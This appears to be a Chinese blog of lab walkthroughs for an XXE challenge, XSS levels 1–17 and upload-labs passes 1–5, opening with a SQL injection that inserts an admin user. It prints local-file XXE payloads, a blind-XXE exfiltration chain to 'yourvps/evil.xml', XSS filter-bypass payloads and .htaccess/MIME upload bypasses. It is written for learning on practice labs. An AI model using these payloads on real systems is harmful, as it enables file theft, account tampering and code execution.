<pre><code class="hljs n1ql">?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h1 id="xxe挑战"><a href="#xxe挑战" class="headerlink" title="xxe挑战"></a>xxe挑战</h1><p>github地址：<a href="https://github.com/vulnspy/phpaudit-XXE/archive/master.zip">https://github.com/vulnspy/phpaudit-XXE/archive/master.zip</a></p>
<p>因为环境搭建比较简单就直接在windows上运行了</p>
<p>读取的文件也随之改变，在D盘中建立一个1.txt</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194816074.png" alt="image-20210303194816074"></p>
<h2 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h2><p>使用如下payload读取文件</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194904746.png" alt="image-20210303194904746"></p>
<p>漏洞原因</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;">

<p>DOmDocument类</p>
<p><code>$dom = new DOMDocument();</code></p>
<pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();
    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$dom</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();
    
&#125;</code></pre>

<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>使用payload：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195204160.png" alt="image-20210303195204160"></p>
<p>漏洞代码</p>
<p>造成 XXE 的类是 SimpleXMLElement</p>
<pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = <span class="hljs-keyword">new</span> SimpleXMLElement(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();   
&#125;</code></pre>

<h2 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h2><p>payload:</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195407342.png" alt="image-20210303195407342"></p>
<p>造成漏洞的是simplexml_load_string，代码如下</p>
<pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    ob_start();
    var_dump(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = ob_get_contents();
    ob_end_clean();
    
&#125;</code></pre>



<h2 id="BlindXXE"><a href="#BlindXXE" class="headerlink" title="BlindXXE"></a>BlindXXE</h2><p>这一关提交payload无法看到内容，但是可以看到是访问成功的</p>
<p>正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么</p>
<p>源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xml</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>-&gt;name))&#123;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$xml</span>-&gt;name;
    &#125;
   <span class="hljs-keyword">echo</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$name</span>)?<span class="hljs-string">&#x27;ok&#x27;</span>:<span class="hljs-string">&#x27;error&#x27;</span>; 
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>上面的例子是因为<code>echo htmlspecialchars($resp);</code>这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。</p>
<p>我们传入如下的payload：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE a [</span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://yourvps/evil.xml&quot;</span>&gt;</span></span>
<span class="hljs-meta">    %dtd;</span>
<span class="hljs-meta">    %send;</span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span></code></pre>

<p>然后在自己的vps上的<strong>evil.xml</strong>写入：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">payload</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</code></pre>

<p>注意，因为这里是参数实体payload来<strong>嵌套定义</strong>参数实体<strong>send</strong>，所以被<strong>嵌套定义</strong>的参数实体<code>%</code>一定要HTML编码为：<code>%</code></p>
<p>如此一来，调用的过程就变成了：参数实体dtd通过<strong>http</strong>协议来访问vps上的<strong>evil.xml</strong>，然后返回<strong>evil.xml</strong>的内容，调用了参数实体<strong>payload</strong>，然后<strong>payload</strong>又调用了参数实体<strong>send</strong>，<strong>send</strong>的作用就是把参数实体<strong>file</strong>（即文件D:/1.txt的base64编码内容）发送到我们的vps上，注意在服务器上监听</p>
<h1 id="xss通关"><a href="#xss通关" class="headerlink" title="xss通关"></a>xss通关</h1><p>因为网上有挑战题目的网址就没在本地搭建</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>最基础的xss，get提交</p>
<pre><code class="hljs javascript">?name=<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303151729341.png" alt="image-20210303151729341"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>第二关直接提交会发现没有弹窗</p>
<p>查看源码可以看到，因为<code>&lt;script&gt;</code>，被包裹在<code>input</code>标签中无法起作用，因此需要先闭合<code>input</code>标签</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152358665.png" alt="image-20210303152358665" style="zoom:50%;">



<p>payload</p>
<pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152632625.png" alt="image-20210303152632625" style="zoom:50%;">



<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>直接提交查看源码</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152721584.png" alt="image-20210303152721584"></p>
<p>可以发现提交后的数据经过<code>htmlspecialchars()</code>转化成了实体变量不在有js代码的作用，所以需要换一种方法</p>
<p>payload</p>
<pre><code class="hljs \">&#39;onclick&#x3D;&#39;javascript:alert(1)&#39;</code></pre>

<p>再点击一次就可以过关</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>这题与上面的一样只不过这次换成了双引号闭合</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153135610.png" alt="image-20210303153135610"></p>
<pre><code class="hljs 1c"><span class="hljs-string">&quot;onclick=&#x27;javascript:alert(1)&#x27;</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153118763.png" alt="image-20210303153118763" style="zoom:50%;">

<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>提交<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153451829.png" alt="image-20210303153451829"></p>
<p>可以发现script被换成了scr_ipt，使用<code>&quot;onclick=&#39;javascript:alert(1)&#39;</code>也不行</p>
<p>再换一种方法</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153621744.png" alt="image-20210303153621744"></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>尝试了</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>&gt;&lt;a <span class="hljs-attribute">hr_ef</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;&quot;&gt;
&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>o_nclick=&#x27;javascript:alert(1)&#x27; <span class="hljs-string">&quot;&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;</span> <span class="hljs-string">&quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;</span>&gt;</code></pre>

<p>但是都不行了，尝试了看样子是过了href, onclick, script关键词，尝试大小写绕过</p>
<p>提交</p>
<pre><code class="hljs 1c"><span class="hljs-string">&quot;oNclick=&#x27;javascript:alert(1)&#x27;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160021818.png" alt="image-20210303160021818"></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)&#39;</code>,但是发现on被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160102536.png" alt="image-20210303160102536"></p>
<p>直接尝试双写绕过</p>
<pre><code class="hljs ada">oonnclick=<span class="hljs-symbol">&#x27;javascript</span>:alert(<span class="hljs-number">1</span>)</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160204046.png" alt="image-20210303160204046"></p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)</code>，可以发现过滤了 <code>&quot; &lt; &gt;</code>，而且进行了实体转换</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160514318.png" alt="image-20210303160514318"></p>
<p>换一种新的注入方法html字符转换绕过</p>
<pre><code class="hljs apache"><span class="hljs-attribute">java</span>&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:alert(<span class="hljs-number">1</span>)</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160720539.png" alt="image-20210303160720539"></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>尝试第八关使用的代码但是发现不行</p>
<p>但是查看源码可以发现提示你的链接不合法，那么合法的链接有什么特点呢</p>
<p>就是带有协议头</p>
<pre><code class="hljs javascript">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(<span class="hljs-number">1</span>) <span class="hljs-comment">// http://</span></code></pre>

<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>尝试了几种方法之后发现 ,没有输出点</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162415275.png" alt="image-20210303162415275"></p>
<p>可以发现输入点是隐藏的</p>
<p>使用下面代码测试以上三个哪个是可以注入的</p>
<pre><code class="hljs dts"><span class="hljs-variable">&amp;t_link</span>=<span class="hljs-string">&quot; text&quot;</span> <span class="hljs-variable">&amp;t_history</span>=<span class="hljs-string">&quot;text&quot;</span><span class="hljs-variable">&amp;t_sort</span>=<span class="hljs-string">&quot;text&quot;</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162558986.png" alt="image-20210303162558986"></p>
<p>再构造代码</p>
<pre><code class="hljs isbl">&amp;<span class="hljs-variable">t_sort</span>=<span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162721705.png" alt="image-20210303162721705"></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>进入页面后尝试使用上一关的方法但是无效，上网查看后发现是再refere头注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164336051.png" alt="image-20210303164336051" style="zoom:50%;">

<p>可以发现相应包中已经被注入了XSS</p>
<p>在抓包页面返回给浏览器，就会出现被注入的输入框</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164657154.png" alt="image-20210303164657154" style="zoom:50%;">

<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>继续抓包，这次可以发现是在UA中注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164836733.png" alt="image-20210303164836733" style="zoom:67%;">

<p>与上一关做法相似</p>
<p>出现输入框点击即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164930662.png" alt="image-20210303164930662" style="zoom:50%;">

<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>这关是在cookie处注入，方法与之前相同</p>
<p>payload</p>
<pre><code class="hljs isbl"><span class="hljs-variable">cookie</span>: 原值+<span class="hljs-variable">user</span>=<span class="hljs-string">&quot; type=text onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303165143032.png" alt="image-20210303165143032" style="zoom:67%;">

<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>需要使用带XSS的图片</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>直接查看源码</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171027487.png" alt="image-20210303171027487" style="zoom:50%;">



<p>这里用了angularjs的ng-include，直接在包含的页面里用<code>&lt;script&gt;</code>触发不了，用了img标签</p>
<p>AngularJS ng-include 指令</p>
<p>ng-include 指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。</p>
<p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
<pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">element</span> ng-<span class="hljs-built_in">include</span>=<span class="hljs-string">&quot;filename&quot;</span> onload=<span class="hljs-string">&quot;expression&quot;</span> autoscroll=<span class="hljs-string">&quot;expression&quot;</span> &gt;&lt;/<span class="hljs-keyword">element</span>&gt;</code></pre>

<p>遵循SOP，只好调用第一关代码。</p>
<p>需要单引号包裹，否则变成注释。</p>
<p>paload：</p>
<pre><code class="hljs xml">/level15.php?src=&#x27;level1.php?name=test<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171428095.png" alt="image-20210303171428095" style="zoom:50%;">

<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p>测试发现过滤空格，script，/，所以使用%0d %0a做分割符绕过过滤</p>
<p>payload</p>
<pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>Aonerror<span class="hljs-operator">=</span>alert(a)&gt;

&lt;iframe<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donmouseover<span class="hljs-operator">=</span>alert`<span class="hljs-number">1</span>`&gt;&lt;/iframe&gt;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171803825.png" alt="image-20210303171803825" style="zoom:50%;">



<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>查看源码找到注入位置</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303172359498.png" alt="image-20210303172359498" style="zoom:50%;">



<p>但是这里过滤<code>&lt;, &gt;</code>，使用事件触发弹窗</p>
<p>Payload：</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)</code></pre>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>环境使用phpstudy很容易搭建</p>
<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止/允许特定IP/IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
